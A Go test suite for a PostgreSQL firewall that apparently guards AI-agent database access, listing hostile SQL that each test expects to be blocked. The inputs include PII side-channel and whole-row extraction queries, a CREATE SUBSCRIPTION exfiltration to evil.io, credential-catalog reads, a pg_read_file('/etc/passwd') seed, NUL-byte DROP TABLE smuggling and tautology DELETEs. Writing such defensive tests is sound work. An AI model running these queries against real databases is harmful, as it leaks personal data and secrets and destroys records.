package firewall

import (
	"slices"
	"strings"
	"testing"

	"github.com/duhanguler/pgveil/internal/pii"
	"github.com/duhanguler/pgveil/internal/policy"
)

func testPermissiveWithGuardsProfile() *policy.RoleProfile {
	return &policy.RoleProfile{
		Name: "guarded_dev",
		Firewall: policy.FirewallPolicy{
			AllowStatements:         []string{"*"},
			BlockDDL:                true,
			BlockMultiStatement:     true,
			BlockWriteWithoutWhere:  true,
			BlockDangerousFunctions: true,
			BlockSystemCatalogs:     true,
			BlockPIIInference:       true,
			ProtectedColumns:        []string{"tckn", "iban", "ssn", "card_number", "secret_value"},
			MaxRows:                 500,
			MaxRowsAction:           "truncate",
		},
		Masking: policy.MaskingPolicy{
			Enabled:       true,
			AutoDetectPII: true,
			ColumnRules: []policy.ColumnRule{
				{Column: "full_name", Strategy: pii.StrategyHash},
				{Column: "tckn", Strategy: pii.StrategyPartial},
			},
		},
	}
}

func TestRedTeamCTFBypassSuite(t *testing.T) {
	aiProf := testAIAgentProfile()
	devProf := testPermissiveWithGuardsProfile()

	cases := []struct {
		name       string
		prof       *policy.RoleProfile
		sql        string
		wantAction Action
		wantRule   string
	}{
		// --- 1. Multi-hop CTE & Subquery Taint Propagation ---
		{
			name:       "CTE alias side-channel WHERE LIKE blocked",
			prof:       aiProf,
			sql:        "WITH leak AS (SELECT id, tckn AS innocent FROM customers) SELECT id FROM leak WHERE innocent LIKE '100000%'",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "Multi-hop CTE taint propagation ORDER BY blocked",
			prof:       aiProf,
			sql:        "WITH a AS (SELECT tckn AS p1 FROM customers), b AS (SELECT p1 AS p2 FROM a) SELECT p2 FROM b ORDER BY p2",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "CTE explicit column alias list taint blocked",
			prof:       aiProf,
			sql:        "WITH c(a, b) AS (SELECT id, tckn FROM customers) SELECT a FROM c WHERE b = '10000000146'",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "Subquery alias WHERE comparison blocked",
			prof:       aiProf,
			sql:        "SELECT id FROM (SELECT id, iban AS x FROM customers) sub WHERE x > 'TR00'",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "Subquery alias colnames taint blocked",
			prof:       aiProf,
			sql:        "SELECT k FROM (SELECT id, tckn FROM customers) AS sub(k, v) WHERE v LIKE '1%'",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "Subquery alias SUBSTRING exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT id, SUBSTRING(x, 1, 6) FROM (SELECT id, iban AS x FROM customers) sub",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},

		// --- 2. Positional ORDER BY / GROUP BY Binary-Search Oracle ---
		{
			name:       "Positional ORDER BY 2 on protected column blocked",
			prof:       aiProf,
			sql:        "SELECT id, tckn FROM customers ORDER BY 2",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "Positional GROUP BY 2 on protected column blocked",
			prof:       aiProf,
			sql:        "SELECT id, ssn FROM customers GROUP BY 1, 2",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "UNION positional ORDER BY 2 oracle blocked",
			prof:       aiProf,
			sql:        "(SELECT id, tckn FROM customers UNION ALL SELECT 0, '10000000000') ORDER BY 2",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},

		// --- 3. Whole-Row Record Serialization Exfiltration ---
		{
			name:       "Whole-row alias::text exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT c::text FROM customers c LIMIT 5",
			wantAction: ActionBlock,
			wantRule:   "pii_whole_row_exfiltration",
		},
		{
			name:       "Whole-row table::text exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT customers::text FROM customers LIMIT 5",
			wantAction: ActionBlock,
			wantRule:   "pii_whole_row_exfiltration",
		},
		{
			name:       "Whole-row row_to_json(c) exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT row_to_json(c) FROM customers c LIMIT 5",
			wantAction: ActionBlock,
			wantRule:   "pii_whole_row_exfiltration",
		},
		{
			name:       "Whole-row to_jsonb(customers) exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT to_jsonb(customers) FROM customers LIMIT 5",
			wantAction: ActionBlock,
			wantRule:   "pii_whole_row_exfiltration",
		},
		{
			name:       "Bare whole-row SELECT c FROM customers c blocked",
			prof:       aiProf,
			sql:        "SELECT c FROM customers c LIMIT 5",
			wantAction: ActionBlock,
			wantRule:   "pii_whole_row_exfiltration",
		},

		// --- 4. PG 16/17 SQL/JSON & SQL/XML Serialization & JOIN USING / LIMIT ---
		{
			name:       "SQL/JSON JSON_OBJECT exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT JSON_OBJECT('id': tckn) FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "SQL/JSON JSON_ARRAY exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT JSON_ARRAY(tckn) FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "SQL/JSON JSON_OBJECTAGG exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT JSON_OBJECTAGG(id: tckn) FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "SQL/JSON JSON_ARRAYAGG exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT JSON_ARRAYAGG(tckn) FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "SQL/XML XMLFOREST exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT XMLFOREST(tckn) FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "SQL/XML XMLELEMENT exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT XMLELEMENT(NAME leak, tckn) FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "SQL/XML XMLSERIALIZE exfiltration blocked",
			prof:       aiProf,
			sql:        "SELECT XMLSERIALIZE(CONTENT tckn AS text) FROM customers",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "JOIN USING (tckn) blocked",
			prof:       aiProf,
			sql:        "SELECT c1.id FROM customers c1 JOIN customers c2 USING (tckn)",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},
		{
			name:       "LIMIT subquery oracle blocked",
			prof:       aiProf,
			sql:        "SELECT id FROM customers LIMIT (SELECT count(*) FROM customers WHERE tckn LIKE '1%')",
			wantAction: ActionBlock,
			wantRule:   "pii_side_channel_inference",
		},

		// --- 5. Fail-Closed DDL & COPY Exfiltration (even when allow_statements=['*']) ---
		{
			name:       "ALTER TABLE RENAME blocked as DDL",
			prof:       devProf,
			sql:        "ALTER TABLE customers RENAME TO pwned",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "ALTER TABLE OWNER blocked as DDL",
			prof:       devProf,
			sql:        "ALTER TABLE customers OWNER TO evil_role",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "DROP OWNED BY blocked as DDL",
			prof:       devProf,
			sql:        "DROP OWNED BY pgveil",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "CREATE SUBSCRIPTION exfiltration blocked as DDL",
			prof:       devProf,
			sql:        "CREATE SUBSCRIPTION exfil CONNECTION 'host=evil.io dbname=x' PUBLICATION p1",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "CREATE SERVER FDW blocked as DDL",
			prof:       devProf,
			sql:        "CREATE SERVER evil_srv FOREIGN DATA WRAPPER postgres_fdw",
			wantAction: ActionBlock,
			wantRule:   "block_ddl",
		},
		{
			name:       "COPY TO STDOUT blocked on masked/row-capped profile",
			prof:       devProf,
			sql:        "COPY customers TO STDOUT",
			wantAction: ActionBlock,
			wantRule:   "block_copy_exfiltration",
		},

		// --- 6. Dangerous Functions & Credential System Catalogs ---
		{
			name:       "current_setting GUC secret disclosure blocked",
			prof:       aiProf,
			sql:        "SELECT current_setting('ssl_key_file')",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "setval SELECT sequence sabotage blocked",
			prof:       aiProf,
			sql:        "SELECT setval('orders_id_seq', 99999999)",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "pg_sleep DoS blocked",
			prof:       aiProf,
			sql:        "SELECT pg_sleep(60)",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "pg_advisory_lock DoS blocked",
			prof:       aiProf,
			sql:        "SELECT pg_advisory_lock(42)",
			wantAction: ActionBlock,
			wantRule:   "block_dangerous_functions",
		},
		{
			name:       "pg_user_mappings cleartext FDW password catalog blocked",
			prof:       aiProf,
			sql:        "SELECT * FROM pg_user_mappings",
			wantAction: ActionBlock,
			wantRule:   "block_system_catalogs",
		},
		{
			name:       "pg_subscription replication password catalog blocked",
			prof:       aiProf,
			sql:        "SELECT subconninfo FROM pg_subscription",
			wantAction: ActionBlock,
			wantRule:   "block_system_catalogs",
		},
		{
			name:       "pg_largeobject raw binary blob catalog blocked",
			prof:       aiProf,
			sql:        "SELECT data FROM pg_largeobject",
			wantAction: ActionBlock,
			wantRule:   "block_system_catalogs",
		},
		{
			name:       "pg_toast schema internal storage table blocked",
			prof:       aiProf,
			sql:        "SELECT * FROM pg_toast.pg_toast_16384",
			wantAction: ActionBlock,
			wantRule:   "block_system_catalogs",
		},

		// --- 7. Arithmetic & Structural Tautologies ---
		{
			name:       "DELETE arithmetic tautology 1+1=2 blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE 1 + 1 = 2",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE arithmetic tautology 10-5>3 blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE 10 - 5 > 3",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE BETWEEN constant tautology blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE 5 BETWEEN 1 AND 10",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE constant IS NOT NULL tautology blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE 1 IS NOT NULL",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE BooleanTest (1=1) IS TRUE tautology blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE (1 = 1) IS TRUE",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE IS NOT DISTINCT FROM self-equality blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE id IS NOT DISTINCT FROM id",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE COALESCE(true, false) tautology blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE COALESCE(true, false)",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE CASE tautology blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE CASE WHEN 1 = 1 THEN true ELSE false END",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE EXISTS (SELECT 1) tautology blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE EXISTS (SELECT 1)",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE constant LIKE '%' tautology blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE 'x' LIKE '%'",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "DELETE recursive NOT (false OR 1=2) tautology blocked",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE NOT (false OR 1 = 2)",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},
		{
			name:       "MERGE ON 1=1 tautology blocked",
			prof:       devProf,
			sql:        "MERGE INTO orders t USING orders s ON 1 = 1 WHEN MATCHED THEN DELETE",
			wantAction: ActionBlock,
			wantRule:   "block_write_without_where",
		},

		// --- 8. Pre-Parse Hygiene & DoS Limits ---
		{
			name:       "Embedded NUL byte C-truncation smuggling blocked",
			prof:       aiProf,
			sql:        "SELECT 1;\x00DROP TABLE orders",
			wantAction: ActionBlock,
			wantRule:   "invalid_nul_byte",
		},
		{
			name:       "Oversized SQL (>1 MiB) DoS payload blocked",
			prof:       aiProf,
			sql:        "SELECT '" + strings.Repeat("A", MaxSQLBytes+10) + "'",
			wantAction: ActionBlock,
			wantRule:   "sql_size_limit",
		},

		// --- 9. Zero False Positives: Normal Analytical & Operational Queries MUST Pass ---
		{
			name:       "Normal masked customer projection allowed",
			prof:       aiProf,
			sql:        "SELECT id, full_name, email, tckn, iban FROM customers ORDER BY id LIMIT 10",
			wantAction: ActionAllow,
			wantRule:   "policy_allow",
		},
		{
			name:       "Analytics JOIN with positional GROUP BY 1 ORDER BY 2 on non-PII allowed",
			prof:       aiProf,
			sql:        "SELECT c.city, COUNT(*) AS cnt, SUM(o.total_amount) FROM customers c JOIN orders o ON o.customer_id = c.id WHERE o.status = 'delivered' GROUP BY 1 ORDER BY 2 DESC LIMIT 10",
			wantAction: ActionAllow,
			wantRule:   "policy_allow",
		},
		{
			name:       "Non-PII CTE analytical query allowed",
			prof:       aiProf,
			sql:        "WITH recent AS (SELECT customer_id, total_amount FROM orders WHERE status = 'delivered') SELECT customer_id, SUM(total_amount) FROM recent GROUP BY 1 LIMIT 10",
			wantAction: ActionAllow,
			wantRule:   "policy_allow",
		},
		{
			name:       "Scoped DELETE with real predicate allowed on guarded_dev",
			prof:       devProf,
			sql:        "DELETE FROM orders WHERE id = 1001 AND status = 'cancelled'",
			wantAction: ActionAllow,
			wantRule:   "policy_allow",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dec := Evaluate(tc.sql, tc.prof)
			if dec.Action != tc.wantAction {
				t.Fatalf("SQL=%q\ngot action=%s (rule=%s reason=%q)\nwant action=%s (rule=%s)",
					tc.sql, dec.Action, dec.Rule, dec.Reason, tc.wantAction, tc.wantRule)
			}
			if tc.wantRule != "" && dec.Rule != tc.wantRule {
				t.Errorf("SQL=%q: got rule=%q want %q", tc.sql, dec.Rule, tc.wantRule)
			}
		})
	}
}

func TestTransitiveCTEAndUnionAliasProvenance(t *testing.T) {
	prof := testAIAgentProfile()

	// 1. Multi-hop CTE alias chain: full_name -> x -> y -> z
	decCTE := Evaluate("WITH a AS (SELECT full_name AS x FROM customers), b AS (SELECT x AS y FROM a) SELECT y AS z FROM b", prof)
	if decCTE.Action != ActionAllow {
		t.Fatalf("expected ALLOW, got %+v", decCTE)
	}
	if len(decCTE.TargetSources) != 1 || !slices.Contains(decCTE.TargetSources[0], "full_name") {
		t.Fatalf("multi-hop CTE lost full_name provenance: %+v", decCTE.TargetSources)
	}

	// 2. UNION branch column-name smuggling: branch 1 names column 'safe_label', branch 2 injects full_name!
	decUnion := Evaluate("SELECT 0 AS id, 'header' AS safe_label UNION ALL SELECT id, full_name FROM customers", prof)
	if decUnion.Action != ActionAllow {
		t.Fatalf("expected ALLOW, got %+v", decUnion)
	}
	if len(decUnion.TargetSources) != 2 || !slices.Contains(decUnion.TargetSources[1], "full_name") {
		t.Fatalf("UNION lost branch-2 full_name provenance: %+v", decUnion.TargetSources)
	}

	// 3. Scalar subquery target provenance
	decScalar := Evaluate("SELECT id, (SELECT full_name FROM customers c2 WHERE c2.id = c1.id LIMIT 1) AS x FROM customers c1", prof)
	if decScalar.Action != ActionAllow {
		t.Fatalf("expected ALLOW, got %+v", decScalar)
	}
	if len(decScalar.TargetSources) != 2 || !slices.Contains(decScalar.TargetSources[1], "full_name") {
		t.Fatalf("scalar subquery lost full_name provenance: %+v", decScalar.TargetSources)
	}
}

func TestDeepASTComplexityGuardNeverPanics(t *testing.T) {
	prof := testAIAgentProfile()
	// Deeply nested CASE expression (160 levels) must hit depth guard cleanly without stack overflow
	var b strings.Builder
	b.WriteString("SELECT ")
	for i := 0; i < 160; i++ {
		b.WriteString("CASE WHEN true THEN ")
	}
	b.WriteString("1")
	for i := 0; i < 160; i++ {
		b.WriteString(" ELSE 0 END")
	}
	dec := Evaluate(b.String(), prof)
	if dec.Action != ActionBlock {
		t.Fatalf("expected deeply nested AST to be blocked, got %+v", dec)
	}
}

// FuzzEvaluate exercises Evaluate with arbitrary mutated SQL strings to ensure zero panics.
func FuzzEvaluate(f *testing.F) {
	seeds := []string{
		"SELECT id, full_name, email, tckn FROM customers LIMIT 5",
		"WITH a AS (SELECT tckn AS x FROM customers) SELECT x FROM a WHERE x LIKE '1%'",
		"DELETE FROM orders WHERE 1 + 1 = 2",
		"SELECT c::text FROM customers c",
		"SELECT JSON_OBJECT('k': tckn), XMLFOREST(iban) FROM customers",
		"(SELECT id, tckn FROM customers UNION ALL SELECT 0, '1') ORDER BY 2",
		"EXPLAIN SELECT id FROM customers WHERE tckn = '10000000146'",
		"MERGE INTO orders t USING orders s ON 1=1 WHEN MATCHED THEN DELETE",
		"SELECT 1;\x00DROP TABLE orders",
		"COPY customers TO STDOUT",
		"ALTER TABLE customers RENAME TO pwned",
		"VALUES (pg_read_file('/etc/passwd'))",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	prof := testAIAgentProfile()
	f.Fuzz(func(t *testing.T, sql string) {
		if len(sql) > 8192 {
			return
		}
		_ = Evaluate(sql, prof)
	})
}
